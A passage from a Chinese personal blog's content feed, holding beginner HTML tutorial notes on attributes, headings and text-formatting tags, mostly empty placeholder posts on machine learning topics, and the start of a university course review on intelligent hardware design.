html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter your email&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong><code>target</code></strong>（用于 <code>&lt;a&gt;</code> 和 <code>&lt;form&gt;</code> 元素）：指定链接或表单提交的目标窗口或框架。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>Open in new tab<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="布尔属性"><a href="#布尔属性" class="headerlink" title="布尔属性"></a>布尔属性</h6><p>布尔属性是指不需要值的属性，它们的存在即表示 true，不存在则表示 false。</p><p><strong>disabled</strong>：禁用元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">disabled</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>readonly</strong>：使输入框只读。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">readonly</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>required</strong>：指定输入字段为必填项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong><code>autoplay</code></strong>（用于 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 元素）：自动播放媒体。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video.mp4&quot;</span> <span class="hljs-attr">autoplay</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h6><p>HTML5 引入了 <strong>data-*</strong> 属性，允许开发者自定义属性来存储额外的数据。</p><p><strong>data-*</strong>：用于存储自定义数据，通常通过 JavaScript 访问。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">data-user-id</span>=<span class="hljs-string">&quot;12345&quot;</span> <span class="hljs-attr">data-role</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span>User Info<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="事件处理属性："><a href="#事件处理属性：" class="headerlink" title="事件处理属性："></a>事件处理属性：</h6><p>HTML 元素可以通过事件处理属性来响应特定的事件，如点击、鼠标悬停等。</p><p><strong>onclick</strong>：当用户点击元素时触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Button clicked!&#x27;)&quot;</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>onmouseover</strong>：当用户将鼠标悬停在元素上时触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;this.style.backgroundColor=&#x27;yellow&#x27;&quot;</span>&gt;</span>Hover over me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>onchange</strong>：当元素的值发生变化时触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">onchange</span>=<span class="hljs-string">&quot;alert(&#x27;Value changed!&#x27;)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <strong>更多属性参考</strong>：<a href="https://www.runoob.com/tags/ref-standardattributes.html">HTML 标准属性参考手册</a></p><h5 id="HTML-标题："><a href="#HTML-标题：" class="headerlink" title="HTML 标题："></a>HTML 标题：</h5><p>标题（Heading）是通过 &lt; h1 &gt; - &lt; h6 &gt; 标签进行定义的。</p><p>&lt; h1 &gt; 定义最大的标题。 &lt; h6 &gt; 定义最小的标题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是一个标题。<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>这是一个标题。<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这是一个标题。<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="HTML水平线"><a href="#HTML水平线" class="headerlink" title="HTML水平线"></a>HTML水平线</h6><p>&lt; hr &gt; 标签在 HTML 页面中创建水平线。用于分隔内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="HTML注释"><a href="#HTML注释" class="headerlink" title="HTML注释"></a>HTML注释</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 这是一个注释 --&gt;</span><br></code></pre></td></tr></table></figure><p>开始括号之后（左边的括号）需要紧跟一个叹号 <strong>!</strong> (英文标点符号)，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。</p><h6 id="参考标签"><a href="#参考标签" class="headerlink" title="参考标签"></a>参考标签</h6><p><img src="/./../00000000/image-20250331205035413.png" alt="image-20250331205035413"></p><h5 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a>HTML 段落</h5><p>段落是通过 &lt; p &gt; 标签定义的。</p><p>如果您希望在不产生一个新段落的情况下进行换行（新行），请使用 <strong>&lt; br &gt;</strong> 标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这个<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>段落<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>演示了分行的效果<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="参考标签-1"><a href="#参考标签-1" class="headerlink" title="参考标签"></a>参考标签</h6><p><img src="/./../00000000/image-20250331205400456.png" alt="image-20250331205400456"></p><h5 id="HTML-文本格式化"><a href="#HTML-文本格式化" class="headerlink" title="HTML 文本格式化"></a>HTML 文本格式化</h5><h6 id="参考标签-2"><a href="#参考标签-2" class="headerlink" title="参考标签"></a>参考标签</h6><p><strong>HTML文本格式化标签</strong></p><p><img src="/./../00000000/image-20250331205513693.png" alt="image-20250331205513693"></p><p><strong>HTML “计算机输出标签”</strong></p><p><img src="/./../00000000/image-20250331205734436.png" alt="image-20250331205734436"></p><p><strong>HTML 引文, 引用, 及标签定义</strong></p><p><img src="/./../00000000/image-20250331205808705.png" alt="image-20250331205808705"></p><p><strong>范例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>这个文本是加粗的<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>这个文本是加粗的<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">big</span>&gt;</span>这个文本字体放大<span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>这个文本是斜体的<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>这个文本是斜体的<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>这个文本是缩小的<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br>这个文本包含<br><span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>下标<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br>这个文本包含<br><span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>上标<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/./../00000000/image-20250331210115626.png" alt="image-20250331210115626"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>计算机输出<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">kbd</span>&gt;</span>键盘输入<span class="hljs-tag">&lt;/<span class="hljs-name">kbd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tt</span>&gt;</span>打字机文本<span class="hljs-tag">&lt;/<span class="hljs-name">tt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">samp</span>&gt;</span>计算机代码样本<span class="hljs-tag">&lt;/<span class="hljs-name">samp</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">var</span>&gt;</span>计算机变量<span class="hljs-tag">&lt;/<span class="hljs-name">var</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>注释：<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>这些标签常用于显示计算机/编程代码。<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/./../00000000/image-20250331210044667.png" alt="image-20250331210044667"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>引用实例<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>引用<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在这个示例中，第一个和第二个引用使用了 blockquote 标签，因为它们较长，需要独立的块来展示；而第三个引用使用了 q 标签，因为它比较短，可以内联显示。<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Life is what happens when you&#x27;re busy making other plans.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>— John Lennon<span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>If you want to know what a man&#x27;s like, take a good look at how he treats his inferiors, not his equals.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>— J.K. Rowling, Harry Potter and the Goblet of Fire<span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        In his famous quote, Einstein said: <span class="hljs-tag">&lt;<span class="hljs-name">q</span>&gt;</span>E=mc²<span class="hljs-tag">&lt;/<span class="hljs-name">q</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/./../00000000/image-20250331210030293.png" alt="image-20250331210030293"></p>]]></content>
    
    
    <categories>
      
      <category>项目开发实践</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vue</title>
    <link href="/Vue%E5%AD%A6%E4%B9%A0/"/>
    <url>/Vue%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Vue学习"><a href="#Vue学习" class="headerlink" title="Vue学习"></a>Vue学习</h1><p><strong>学习链接[官方文档]：</strong><a href="https://cn.vuejs.org/guide/introduction">简介 | Vue.js</a></p>]]></content>
    
    
    <categories>
      
      <category>项目开发实践</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>卷积神经网络</title>
    <link href="/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <url>/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
      <category>深度学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大模型学习的数学基础</title>
    <link href="/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
    <url>/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="大模型数学基础"><a href="#大模型数学基础" class="headerlink" title="大模型数学基础"></a>大模型数学基础</h1><p><strong>1.线性代数</strong></p><p><strong>2.高等数学</strong></p><p><strong>3.概率论与数理统计</strong></p><h2 id="1-线性代数"><a href="#1-线性代数" class="headerlink" title="1.线性代数"></a>1.线性代数</h2><h2 id="2-高等数学【微积分】"><a href="#2-高等数学【微积分】" class="headerlink" title="2.高等数学【微积分】"></a>2.高等数学【微积分】</h2><h2 id="3-概率论与数理统计"><a href="#3-概率论与数理统计" class="headerlink" title="3.概率论与数理统计"></a>3.概率论与数理统计</h2><h3 id="第四章-随机变量的数字特征"><a href="#第四章-随机变量的数字特征" class="headerlink" title="第四章   随机变量的数字特征"></a>第四章   随机变量的数字特征</h3><p><strong>数学期望</strong><br>$$<br>设随机变量X的分布律为P{x_k} &#x3D; p_k, k&#x3D;1,2,3,4…,<br>$$</p><p>$$<br>若级数\sum_{k&#x3D;1}^{\infty} x_kp_k绝对收敛，则称EX &#x3D; \sum_{k&#x3D;1}^{\infty} x_k*p_k为随机变量的数学期望<br>$$</p><p>$$<br>如果级数\sum_{k&#x3D;1}^{\infty} |x_k|p_k不收敛，则称X的数学期望不存在，数学期望也称平均值，均值<br>$$</p><p><strong>连续型随机变量的数学期望</strong></p>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>循环神经网络</title>
    <link href="/%E5%BE%AA%E7%8E%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <url>/%E5%BE%AA%E7%8E%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="循环神经网络"><a href="#循环神经网络" class="headerlink" title="循环神经网络"></a>循环神经网络</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
      <category>深度学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库</title>
    <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="数据库-sql"><a href="#数据库-sql" class="headerlink" title="数据库 [ sql ]"></a>数据库 [ sql ]</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>机器学习_two</title>
    <link href="/%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/"/>
    <url>/%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
      <category>机器学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>机器学习_one</title>
    <link href="/%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/"/>
    <url>/%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
      <category>机器学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>神经网络基础</title>
    <link href="/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <url>/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="神经网络基础"><a href="#神经网络基础" class="headerlink" title="神经网络基础"></a>神经网络基础</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
      <category>深度学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>自然语言处理基础</title>
    <link href="/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E5%9F%BA%E7%A1%80/"/>
    <url>/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="自然语言处理基础"><a href="#自然语言处理基础" class="headerlink" title="自然语言处理基础"></a>自然语言处理基础</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
      <category>深度学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>深度学习框架</title>
    <link href="/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6/"/>
    <url>/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="深度学习框架"><a href="#深度学习框架" class="headerlink" title="深度学习框架"></a>深度学习框架</h1>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
      <category>深度学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>智能硬件设计理论课复习总结</title>
    <link href="/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E6%B1%82%E5%AE%9E%E4%B9%A6%E9%99%A2%E7%89%B9%E8%89%B2%E8%AF%BE%E7%A8%8B___%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E8%AE%BE%E8%AE%A1%E7%90%86%E8%AE%BA%E8%AF%BE%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E6%B1%82%E5%AE%9E%E4%B9%A6%E9%99%A2%E7%89%B9%E8%89%B2%E8%AF%BE%E7%A8%8B___%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E8%AE%BE%E8%AE%A1%E7%90%86%E8%AE%BA%E8%AF%BE%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="大连理工大学求实书院特色课程-智能硬件设计理论课复习总结"><a href="#大连理工大学求实书院特色课程-智能硬件设计理论课复习总结" class="headerlink" title="大连理工大学求实书院特色课程___智能硬件设计理论课复习总结"></a>大连理工大学求实书院特色课程___智能硬件设计理论课复习总结</h1><h4 id="课程属性："><a href="#课程属性：" class="headerlink" title="课程属性："></a><strong>课程属性：</strong></h4><p>课程类型：<strong>求实书院全体，650+人，必修课(计入保研和奖学金）</strong></p><p>开课院系：<strong>集成电路学院</strong>  </p><p>学分与学时：<strong>课程学分：3学分</strong> l <strong>课程学时：16学时理论(01~04周) + 32学时实践(05-12周，后续通知)</strong> </p><p>课程考核：<strong>期末考试：占60%，笔试闭卷</strong> <strong>平时成绩：占10%</strong>，<strong>平时作业、课堂测试等</strong>  <strong>实践成绩：占30%，实践课程(1至2人一组)，30分满分</strong> <strong>额外成绩：指定竞   赛的指定赛道，最多10分实践加分，不超出实践总分</strong></p><h4 id="理论内容基础："><a href="#理论内容基础：" class="headerlink" title="理论内容基础："></a><strong>理论内容基础</strong>：</h4><p>基础知识：信息系统的发展、现状和体系结构</p><p>系统知识：基础硬件系统开发、智能化系统软硬体系</p><p>创新知识：新方法、新模式、新功能</p><h4 id="实践内容基础："><a href="#实践内容基础：" class="headerlink" title="实践内容基础："></a>实践内容基础：</h4><p>系统基础：OpenHarmony&#x2F;LiteOS系统基础认知</p><p>感知基础：智能硬件体系中的感知技术</p><p>控制基础：智能硬件体系中的控制方法</p><p>应用能力：基于星闪HiSpark 